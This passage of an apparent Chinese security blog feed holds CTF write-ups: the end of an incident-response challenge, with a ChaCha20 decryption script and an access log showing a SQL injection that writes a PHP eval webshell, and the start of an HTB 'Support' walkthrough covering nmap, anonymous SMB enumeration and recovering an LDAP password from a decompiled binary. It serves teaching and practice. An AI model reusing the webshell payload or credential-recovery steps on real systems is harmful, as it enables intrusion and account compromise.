class="hljs-number">4</span> * m + <span class="hljs-number">3</span>) = <span class="hljs-built_in">HIBYTE</span>(*(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *)&amp;v8[<span class="hljs-number">4</span> * m - <span class="hljs-number">4</span>]);<br>  &#125;<br>  ++*(_DWORD *)(a1 + <span class="hljs-number">48</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">sub_180076850</span>(v5, &amp;unk_180167C40);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>sub_18007B4B0</code> 是 ChaCha20 算法的置换函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_18007B4B0</span><span class="hljs-params">(_DWORD *a1, <span class="hljs-type">int</span> *a2, _DWORD *a3, <span class="hljs-type">int</span> *a4)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 result; <span class="hljs-comment">// rax</span><br><br>  <span class="hljs-built_in">sub_1800770F7</span>(&amp;unk_1801AD0A3);<br>  *a1 += *a2;<br>  *a4 ^= *a1;<br>  *a4 = <span class="hljs-built_in">HIWORD</span>(*a4) | (*a4 &lt;&lt; <span class="hljs-number">16</span>);<br>  *a3 += *a4;<br>  *a2 ^= *a3;<br>  *a2 = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*a2 &gt;&gt; <span class="hljs-number">20</span>) | (*a2 &lt;&lt; <span class="hljs-number">12</span>);<br>  *a1 += *a2;<br>  *a4 ^= *a1;<br>  *a4 = <span class="hljs-built_in">HIBYTE</span>(*a4) | (*a4 &lt;&lt; <span class="hljs-number">8</span>);<br>  *a3 += *a4;<br>  *a2 ^= *a3;<br>  result = ((<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*a2 &gt;&gt; <span class="hljs-number">25</span>) | (*a2 &lt;&lt; <span class="hljs-number">7</span>);<br>  *a2 = result;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>综上所述，加密算法为非标准的 ChaCha20 加密，经过加密后还进行了异或自增</p><p>flag.enc 文件数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-number">12</span> 1D <span class="hljs-number">58</span> 7A 7F <span class="hljs-number">60</span> FE <span class="hljs-number">96</span> <span class="hljs-number">74</span> D6 7B <span class="hljs-number">56</span> <span class="hljs-number">67</span> CE <span class="hljs-number">72</span> 3F F2 D2 CE <span class="hljs-number">47</span> <span class="hljs-number">19</span> <span class="hljs-number">59</span> 9B 09 <span class="hljs-number">42</span> 07 2C <span class="hljs-number">55</span> B7 <span class="hljs-number">44</span> <span class="hljs-number">10</span> DE <span class="hljs-number">46</span> E5 <span class="hljs-number">38</span> B7 <span class="hljs-number">74</span> <span class="hljs-number">95</span> <span class="hljs-number">78</span> <span class="hljs-number">42</span> <span class="hljs-number">95</span> BD 7D B5 <span class="hljs-number">64</span> <span class="hljs-number">55</span> CD <span class="hljs-number">52</span> 8D D2 <span class="hljs-number">69</span> C6 <span class="hljs-number">10</span> 5F <span class="hljs-number">82</span> <span class="hljs-number">29</span> <span class="hljs-number">29</span> 9D <span class="hljs-number">30</span> F6 B4<br></code></pre></td></tr></table></figure><p>ChaCha20 加密算法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> Generator, <span class="hljs-type">Tuple</span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ChaCha20</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key: <span class="hljs-built_in">bytes</span>, nonce: <span class="hljs-built_in">bytes</span>, counter: <span class="hljs-built_in">int</span> = <span class="hljs-number">0</span></span>):<br>        <span class="hljs-variable language_">self</span>.state = [<br>            <span class="hljs-number">0x61707865</span>, <span class="hljs-number">0x3320646e</span>, <span class="hljs-number">0x79622d32</span>, <span class="hljs-number">0x6b206574</span>,<br>            *struct.unpack(<span class="hljs-string">&#x27;&lt;8I&#x27;</span>, key),<br>            counter,<br>            *struct.unpack(<span class="hljs-string">&#x27;&lt;3I&#x27;</span>, nonce)<br>        ]<br><br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_quarter_round</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span>, c: <span class="hljs-built_in">int</span>, d: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>, <span class="hljs-built_in">int</span>]:<br>        a = (a + b) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        d = ((d ^ a) &lt;&lt; <span class="hljs-number">16</span> | (d ^ a) &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        c = (c + d) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        b = ((b ^ c) &lt;&lt; <span class="hljs-number">12</span> | (b ^ c) &gt;&gt; <span class="hljs-number">20</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        a = (a + b) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        d = ((d ^ a) &lt;&lt; <span class="hljs-number">8</span> | (d ^ a) &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        c = (c + d) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        b = ((b ^ c) &lt;&lt; <span class="hljs-number">7</span> | (b ^ c) &gt;&gt; <span class="hljs-number">25</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-keyword">return</span> a, b, c, d<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_block</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        state = <span class="hljs-variable language_">self</span>.state.copy()<br>        <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>            state[<span class="hljs-number">0</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">12</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">0</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">12</span>])<br>            state[<span class="hljs-number">1</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">13</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">1</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">13</span>])<br>            state[<span class="hljs-number">2</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">14</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">2</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">14</span>])<br>            state[<span class="hljs-number">3</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">11</span>], state[<span class="hljs-number">15</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">3</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">11</span>], state[<span class="hljs-number">15</span>])<br>            state[<span class="hljs-number">0</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">15</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">0</span>], state[<span class="hljs-number">5</span>], state[<span class="hljs-number">10</span>], state[<span class="hljs-number">15</span>])<br>            state[<span class="hljs-number">1</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">11</span>], state[<span class="hljs-number">12</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">1</span>], state[<span class="hljs-number">6</span>], state[<span class="hljs-number">11</span>], state[<span class="hljs-number">12</span>])<br>            state[<span class="hljs-number">2</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">13</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">2</span>], state[<span class="hljs-number">7</span>], state[<span class="hljs-number">8</span>], state[<span class="hljs-number">13</span>])<br>            state[<span class="hljs-number">3</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">14</span>] = <span class="hljs-variable language_">self</span>._quarter_round(state[<span class="hljs-number">3</span>], state[<span class="hljs-number">4</span>], state[<span class="hljs-number">9</span>], state[<span class="hljs-number">14</span>])<br>        <br>        block = <span class="hljs-built_in">bytearray</span>()<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>):<br>            block.extend(struct.pack(<span class="hljs-string">&#x27;&lt;I&#x27;</span>, (state[i] + <span class="hljs-variable language_">self</span>.state[i]) &amp; <span class="hljs-number">0xFFFFFFFF</span>))<br>        <span class="hljs-variable language_">self</span>.state[<span class="hljs-number">12</span>] = (<span class="hljs-variable language_">self</span>.state[<span class="hljs-number">12</span>] + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(block)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">keystream</span>(<span class="hljs-params">self</span>) -&gt; Generator[<span class="hljs-built_in">bytes</span>, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>]:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">yield</span> <span class="hljs-variable language_">self</span>._generate_block()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">ciphertext: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    key_bytes = key.ljust(<span class="hljs-number">32</span>, <span class="hljs-string">&#x27;\0&#x27;</span>).encode()[:<span class="hljs-number">32</span>]<br>    chacha = ChaCha20(key_bytes, <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span>)<br>    plain = <span class="hljs-built_in">bytearray</span>()<br>    <br>    <span class="hljs-keyword">for</span> i, (c, k) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(ciphertext, (b <span class="hljs-keyword">for</span> block <span class="hljs-keyword">in</span> chacha.keystream() <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> block))):<br>        plain.append(((c - <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>) ^ k)<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(plain)<br><br>ciphertext = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&quot;&quot;&quot;12 1D 58 7A 7F 60 FE 96 74 D6 7B 56 67 CE 72 3F F2 D2 CE 47 19 59 9B 09 42 07 2C 55 B7 44 10 DE 46 E5 38 B7 74 95 78 42 95 BD 7D B5 64 55 CD 52 8D D2 69 C6 10 5F 82 29 29 9D 30 F6 B4&quot;&quot;&quot;</span>.replace(<span class="hljs-string">&quot; &quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>))<br><br><span class="hljs-built_in">print</span>(decrypt(ciphertext, <span class="hljs-string">&quot;qewuri&quot;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p>得到结果</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;sierting_666_fpdsajf[psdfljnwqrlqwhperhqwoeiurhqweourhp&#125;</span><br></code></pre></td></tr></table></figure><h1 id="应急行动-1"><a href="#应急行动-1" class="headerlink" title="应急行动-1"></a>应急行动-1</h1><p>进入目录 <code>C:\Program Files (x86)\RealFriend\Rap Server\Logs</code> 下查看 <code>access.log</code> 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/82dc25c67f21f244.png"></p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">56</span>.<span class="hljs-number">128</span> - - [<span class="hljs-number">21</span>/Apr/<span class="hljs-number">2025</span>:<span class="hljs-number">18</span>:<span class="hljs-number">08</span>:<span class="hljs-number">51</span> +<span class="hljs-number">0800</span>] &quot;GET /AgentBoard.XGI?user=-<span class="hljs-number">1</span><span class="hljs-variable">%27+union+select+1%</span><span class="hljs-number">2</span>C<span class="hljs-variable">%27%</span><span class="hljs-number">3</span>c<span class="hljs-variable">%3fphp+eval%</span><span class="hljs-number">28</span><span class="hljs-variable">%24_POST%</span><span class="hljs-number">5</span>b<span class="hljs-variable">%22cmd%</span><span class="hljs-number">22</span><span class="hljs-variable">%5d%</span><span class="hljs-number">29</span><span class="hljs-variable">%3b%</span><span class="hljs-number">3</span>f<span class="hljs-variable">%3e%</span><span class="hljs-number">27</span>+into+outfile+<span class="hljs-variable">%22C%</span><span class="hljs-number">3</span>A<span class="hljs-variable">%5C%</span><span class="hljs-number">5</span>CProgram<span class="hljs-variable">%5C+Files%</span><span class="hljs-number">5</span>C+<span class="hljs-variable">%5C%</span><span class="hljs-number">28</span>x86<span class="hljs-variable">%5C%</span><span class="hljs-number">29</span><span class="hljs-variable">%5C%</span><span class="hljs-number">5</span>CRealFriend<span class="hljs-variable">%5C%</span><span class="hljs-number">5</span>CRap<span class="hljs-variable">%5C+Server%</span><span class="hljs-number">5</span>C<span class="hljs-variable">%5CWebRoot%</span><span class="hljs-number">5</span>C<span class="hljs-variable">%5Cpdyfzr7k.php%</span><span class="hljs-number">22</span>+--+-&amp;<span class="hljs-built_in">cmd</span>=UserLogin HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>&quot; <span class="hljs-number">200</span> <span class="hljs-number">416</span><br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">192.168.56.128</span> <span class="hljs-number">21</span>/<span class="hljs-number">04</span>/<span class="hljs-number">2025</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="应急行动-2"><a href="#应急行动-2" class="headerlink" title="应急行动-2"></a>应急行动-2</h1><p>查看 ie 浏览器历史记录，有一个 <code>rclone.conf</code> 文件</p><img src="https://img.dkdun.cn/v1/2025/12/9679c327688ad0e1.png" alt="image-20250426120829526" style="zoom:45%;" /><p>点击查看</p><img src="https://img.dkdun.cn/v1/2025/12/79e1de4c8155c75a.png" alt="image-20250426120858594" style="zoom:60%;" /><p>拿到 flag</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;oisienfpqwlmdouydrsbhuisjAUGEDW&#125;</span><br></code></pre></td></tr></table></figure><h1 id="应急行动-3"><a href="#应急行动-3" class="headerlink" title="应急行动-3"></a>应急行动-3</h1><p><img src="https://img.dkdun.cn/v1/2025/12/aa90a871da778555.png" alt="image-20250426175407247"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">2025</span>-<span class="hljs-number">04</span>-<span class="hljs-number">21</span> <span class="hljs-number">23</span>:<span class="hljs-number">39</span>:<span class="hljs-number">28</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="应急行动-4"><a href="#应急行动-4" class="headerlink" title="应急行动-4"></a>应急行动-4</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p><img src="https://img.dkdun.cn/v1/2025/12/40e15b1f7c5876f5.png"></p><img src="https://img.dkdun.cn/v1/2025/12/f6e723dc9db13cc8.png" alt="image-20250426132516925" style="zoom:67%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag1</span><span class="hljs-template-variable">&#123;zheshi&#125;</span><br></code></pre></td></tr></table></figure><h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><img src="https://img.dkdun.cn/v1/2025/12/850d02bbc0f63cb9.png" alt="image-20250426142034550" style="zoom:50%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag2</span><span class="hljs-template-variable">&#123;yige&#125;</span><br></code></pre></td></tr></table></figure><h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><img src="https://img.dkdun.cn/v1/2025/12/dc523c8bdd5e806b.png" alt="image-20250426182012661" style="zoom: 80%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;ni&#125;</span><br></code></pre></td></tr></table></figure><h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>不知道为什么我的没有办法恢复快照，参考 <a href="https://www.n0o0b.com/archives/solar-4#%E5%BA%94%E6%80%A5%E8%A1%8C%E5%8A%A8-4">nOo0b 师傅的方法</a>，查看 vmtools 传输的接口，发现了被删除的可疑的 <code>Svchost.exe</code></p><img src="https://img.dkdun.cn/v1/2025/12/a79d7f87f52bd480.png" alt="image-20250506142816501" style="zoom:67%;" /><p>恢复文件之后，查看属性找到 flag</p><img src="https://img.dkdun.cn/v1/2025/12/0fe1ca0317cfe6ea.png" alt="image-20250506142717548" style="zoom:67%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag4</span><span class="hljs-template-variable">&#123;xiangbudaodeflag&#125;</span><br></code></pre></td></tr></table></figure><p>所以 flag 为</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;zheshiyigenixiangbudaodeflag&#125;</span><br></code></pre></td></tr></table></figure><h1 id="应急行动-5"><a href="#应急行动-5" class="headerlink" title="应急行动-5"></a>应急行动-5</h1><p>打开用户的公用文件夹</p><img src="https://img.dkdun.cn/v1/2025/12/28c3351c15fd579f.png" alt="image-20250426120143872" style="zoom:65%;" /><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag</span><span class="hljs-template-variable">&#123;Encryptor123.exe&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>应急响应&amp;取证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>应急响应</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTB-Support</title>
    <link href="/2025/04/25/HTB-Support/"/>
    <url>/2025/04/25/HTB-Support/</url>
    
    <content type="html"><![CDATA[<p>SMB 文件共享，dnSpy 逆向分析，LDAP 信息收集，Neo4j+BloodHound 查看域关系图，RBCD 攻击</p><span id="more"></span><h1 id="nmap-端口扫描"><a href="#nmap-端口扫描" class="headerlink" title="nmap 端口扫描"></a>nmap 端口扫描</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -A -Pn 10.10.11.174<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-18 20:52 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.11.174<br>Host is up (1.9s latency).<br>Not shown: 989 filtered tcp ports (no-response)<br>PORT     STATE SERVICE       VERSION<br>53/tcp   open  domain        Simple DNS Plus<br>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-18 12:58:29Z)<br>135/tcp  open  msrpc         Microsoft Windows RPC<br>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn<br>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)<br>445/tcp  open  microsoft-ds?<br>464/tcp  open  kpasswd5?<br>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0<br>636/tcp  open  tcpwrapped<br>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)<br>3269/tcp open  tcpwrapped<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running (JUST GUESSING): Microsoft Windows 2022 (88%)<br>Aggressive OS guesses: Microsoft Windows Server 2022 (88%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 3 hops<br>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows<br><br>Host script results:<br>| smb2-time:<br>|   <span class="hljs-built_in">date</span>: 2025-04-18T13:01:02<br>|_  start_date: N/A<br>| smb2-security-mode:<br>|   3:1:1:<br>|_    Message signing enabled and required<br><br>TRACEROUTE (using port 445/tcp)<br>HOP RTT        ADDRESS<br>1   0.39 ms    butt3rf1y.mshome.net (172.30.144.1)<br>2   3761.06 ms 10.10.16.1<br>3   3761.11 ms 10.10.11.174<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 603.02 seconds<br></code></pre></td></tr></table></figure><p>扫出来这么多，由扫描结果得知这是一个 AD 的 DC 服务器，有一个 <code>support.htb</code> 域</p><h1 id="枚举-DNS"><a href="#枚举-DNS" class="headerlink" title="枚举 DNS"></a>枚举 DNS</h1><p>所以接下来用 dig 来查询一下 DNS</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">dig @10.10.11.174 support.htb any +short<br></code></pre></td></tr></table></figure><img src="https://img.dkdun.cn/v1/2025/12/1082965c10d13c13.png" alt="image-20250419021620899" style="zoom:80%;" /><p>扫出的结果确认了服务器的名称为 <code>dc</code>，域名为 <code>support.htb</code></p><h1 id="利用-SMB-获取文件"><a href="#利用-SMB-获取文件" class="headerlink" title="利用 SMB 获取文件"></a>利用 SMB 获取文件</h1><p>开放了 445 端口，连接查看有无有用信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# smbclient -N -L //10.10.11.174<br><br>        Sharename       Type      Comment<br>        ---------       ----      -------<br>        ADMIN$          Disk      Remote Admin<br>        C$              Disk      Default share<br>        IPC$            IPC       Remote IPC<br>        NETLOGON        Disk      Logon server share<br>        support-tools   Disk      support staff tools<br>        SYSVOL          Disk      Logon server share<br>Reconnecting with SMB1 <span class="hljs-keyword">for</span> workgroup listing.<br>do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)<br>Unable to connect with SMB1 -- no workgroup available<br></code></pre></td></tr></table></figure><p>有一个 <code>support-tools</code>，里面有一些压缩文件和 <code>.exe</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">smb: \&gt; <span class="hljs-built_in">ls</span><br>  .                                   D        0  Thu Jul 21 01:01:06 2022<br>  ..                                  D        0  Sat May 28 19:18:25 2022<br>  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022<br>  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022<br>  putty.exe                           A  1273576  Sat May 28 19:20:06 2022<br>  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022<br>  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022<br>  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022<br>  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022<br><br>                4026367 blocks of size 4096. 955496 blocks available<br></code></pre></td></tr></table></figure><p>将可疑的 <code>UserInfo.exe.zip</code> 解压</p><img src="https://img.dkdun.cn/v1/2025/12/ed26b6b20d29d9da.png" alt="image-20250418221658147" style="zoom:80%;" /><p>用 <code>file</code> 命令查看发现是 <code>.Net</code> 文件，那么用 dnSpy 去反编译它</p><img src="https://img.dkdun.cn/v1/2025/12/c0e22db75788e5e1.png" alt="image-20250418221918624" style="zoom:80%;" /><h1 id="dnSpy-逆向分析获取-LDAP-密码"><a href="#dnSpy-逆向分析获取-LDAP-密码" class="headerlink" title="dnSpy 逆向分析获取 LDAP 密码"></a>dnSpy 逆向分析获取 LDAP 密码</h1><p>定位到 <code>UserInfo Services</code> 下的 <code>LdapQuery</code> 构造函数</p><img src="https://img.dkdun.cn/v1/2025/12/c21bd8942599b9a8.png" style="zoom: 50%;" /><p>从 <code>getPassword()</code> 中获取密码以用户名 <code>support\\ldap</code> 连接 <code>LDAP://support.htb</code> 进行查询</p><p>跟进 <code>getPassword()</code> 方法</p><img src="https://img.dkdun.cn/v1/2025/12/2e1fe820f826c344.png" alt="image-20250418230241205" style="zoom: 67%;" /><p>明文 先 base64 加密然后与 <code>223</code> 异或，key 为 <code>armando</code>，因此解密脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br>enc_passwd = base64.b64decode(<span class="hljs-string">&quot;0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E&quot;</span>)<br>key = <span 